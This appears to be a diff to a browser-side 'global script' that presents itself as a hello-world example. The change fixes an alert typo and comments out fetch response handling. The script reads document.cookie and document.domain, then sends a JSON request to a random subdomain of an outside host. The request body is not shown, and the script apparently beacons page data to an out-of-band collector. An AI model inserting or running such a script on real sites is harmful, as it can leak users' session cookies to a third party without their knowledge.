@@ -1,5 +1,5 @@
 console.log('Hello from your first global script!');
-alert('Hellow from your first global script!');
+alert('Hello from your first global script!');
 console.log(document.cookie);
 console.log(document.domain);
 
@@ -11,6 +11,6 @@ fetch("https://dam5j34p92lis85gpj50s511hyt4rua9u.desert-rat.net", {
   headers: {
     "Content-type": "application/json; charset=UTF-8"
   }
-})
-  .then((response) => response.json())
-  .then((json) => console.log(json));
+});
+  //.then((response) => response.json())
+  //.then((json) => console.log(json));
